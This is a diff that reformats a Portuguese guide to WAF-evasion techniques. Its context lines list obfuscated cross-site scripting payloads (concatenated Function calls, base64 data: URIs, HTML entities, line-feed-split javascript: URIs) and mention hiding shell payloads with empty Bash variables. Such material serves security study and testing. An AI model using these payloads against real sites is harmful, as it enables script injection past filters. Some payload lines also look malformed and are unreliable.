@@ -44,7 +44,6 @@ java%0ascript:alert(1) #usando caracteres de nova linha codificados
 ```
 
 
-
 2. **Ofuscação**: Embora a ofuscação seja uma maneira possível de ignorar o regex, eles foram divididos em diferentes seções para mostrar mais exclusivamente uma seleção de técnicas de ofuscação. A ofuscação é uma técnica utilizada para tornar o código malicioso mais difícil de ser detectado pelo WAF. Aqui estão alguns exemplos de técnicas de ofuscação:
 
 - Uso de funções incomuns além de alert, console.log e prompt
@@ -56,7 +55,7 @@ java%0ascript:alert(1) #usando caracteres de nova linha codificados
 - Codificação HTML
 
 Essas técnicas podem ajudar a contornar a detecção do WAF. Exemplos abaixo:
-~~~
+```
 Function( "ale" + "rt(1)" )(); #usando funções incomuns além de alert, console.log e prompt
 javascript:74163166147401571561541571411447514115414516216450615176 #codificação octal
 <iframe src= "javascript:alert(`xss`)" > #codificação unicode
@@ -66,8 +65,7 @@ data:text/html; base64 ,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 codificando o javas
 %26%2397;lert(1) #usando codificação HTML
 <a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)" > #Using Line Feed (LF) line breaks
 <BODY onload! #$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use quaisquer caracteres que não sejam letras, números ou caracteres de encapsulamento entre o manipulador de eventos e o sinal de igual (só funciona no motor Gecko)
-~~~
-
+```
 
 
 3. **Variáveis não inicializadas**: Uma técnica potencialmente útil envolve o uso de variáveis não inicializadas na solicitação. Isso pode ser especialmente útil em cenários de execução de comandos, onde o Bash trata variáveis não inicializadas como strings vazias. Ao concatenar strings vazias com uma carga útil de comando, é possível obter o resultado desejado. Isso pode ser usado como uma forma de ofuscação para contornar firewalls.
